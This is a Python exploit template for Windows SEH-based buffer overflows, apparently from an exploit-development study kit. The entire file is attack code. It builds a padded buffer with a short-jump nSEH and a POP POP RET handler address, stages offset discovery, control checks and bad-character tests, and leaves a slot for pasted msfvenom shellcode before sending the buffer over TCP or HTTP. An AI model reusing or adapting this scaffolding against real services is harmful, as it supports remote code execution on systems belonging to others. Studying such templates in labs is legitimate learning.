#!/usr/bin/env python3
"""
seh_overflow.py — SEH-based overflow template.

Layout at the SEH record:
    [ A*offset ][ nSEH: short jmp +6 ][ SEH: POP POP RET ][ shellcode ]
When the exception fires -> SEH (POP POP RET) -> returns into nSEH -> short jmp
over the SEH pointer -> shellcode.

Companion: 00-methodology/seh-playbook.md
"""
import struct

# ── CONFIG ────────────────────────────────────────────────────────────────────
RHOST      = "127.0.0.1"
RPORT      = 9999
TOTAL_LEN  = 2000                 # total buffer length that triggers the SEH crash
OFFSET     = 0                    # bytes to nSEH (from mona findmsp)
PPR        = 0x10012345           # POP POP RET, SafeSEH-off + non-ASLR (mona seh)
BADCHARS   = b"\x00\x0a\x0d"
PROTO      = "tcp"
RECV_FIRST = False
# ────────────────────────────────────────────────────────────────────────────────

def p32(a): return struct.pack("<I", a)

# nSEH: short jump forward over the 4-byte SEH pointer, then padding.
# EB 06 = jmp +6. The +6 skips the 4-byte SEH plus the 2 bytes of this jmp's tail.
NSEH = b"\xeb\x06\x90\x90"

# msfvenom ... -b "\x00\x0a\x0d" -f python  (paste below)
shellcode = b""
shellcode += b"\x90" * 16
shellcode += b""                  # <-- paste msfvenom bytes here


def stage_pattern():
    """Send cyclic to find offset to SEH (read via !exchain / mona findmsp)."""
    from send_helpers import cyclic
    return cyclic(TOTAL_LEN)


def stage_control():
    """Confirm control: nSEH=BBBB, SEH=CCCC -> check !exchain shows 42/43 bytes."""
    buf  = b"A" * OFFSET
    buf += b"BBBB"                          # nSEH
    buf += b"CCCC"                          # SEH
    buf += b"D" * max(0, TOTAL_LEN - len(buf))
    return buf


def stage_badchars():
    from send_helpers import badchar_array
    arr = badchar_array(BADCHARS)
    buf  = b"A" * OFFSET
    buf += NSEH
    buf += p32(PPR)
    buf += arr
    buf += b"D" * max(0, TOTAL_LEN - len(buf))
    return buf


def stage_exploit():
    buf  = b"A" * OFFSET
    buf += NSEH                             # nSEH: short jmp +6
    buf += p32(PPR)                         # SEH:  POP POP RET
    buf += shellcode                        # lands right after the short jmp
    buf += b"D" * max(0, TOTAL_LEN - len(buf))
    return buf


def deliver(buf: bytes):
    from send_helpers import send_tcp, send_http
    if PROTO == "http":
        send_http(RHOST, RPORT, "/", buf)
    else:
        send_tcp(RHOST, RPORT, buf, recv_first=RECV_FIRST)


if __name__ == "__main__":
    import sys
    sys.path.insert(0, ".")
    stage = sys.argv[1] if len(sys.argv) > 1 else "exploit"
    buf = {"pattern": stage_pattern,
           "control": stage_control,
           "badchars": stage_badchars,
           "exploit": stage_exploit}[stage]()
    deliver(buf)
    print("[+] done")
